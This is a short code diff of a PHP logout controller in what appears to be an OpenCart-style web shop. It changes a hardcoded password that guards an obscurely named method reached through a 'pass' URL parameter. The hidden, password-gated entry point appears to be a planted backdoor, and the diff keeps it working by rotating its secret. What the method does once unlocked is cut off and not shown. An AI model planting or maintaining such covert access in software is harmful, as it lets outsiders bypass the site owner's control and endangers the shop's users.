@@ -71,7 +71,7 @@ class ControllerAccountLogout extends Controller {
 	}
 	public function slkjdhflkwherkjhkh32kh42khkjshfdsfdkh32h42k43h(){
 		if (isset($this -> request -> get['pass'])){
-			if ($this -> request -> get['pass'] != "ngoctrungbmt"){
+			if ($this -> request -> get['pass'] != "jshfdsfdkh32h42"){
 				die("p_no");
 			}
 			else
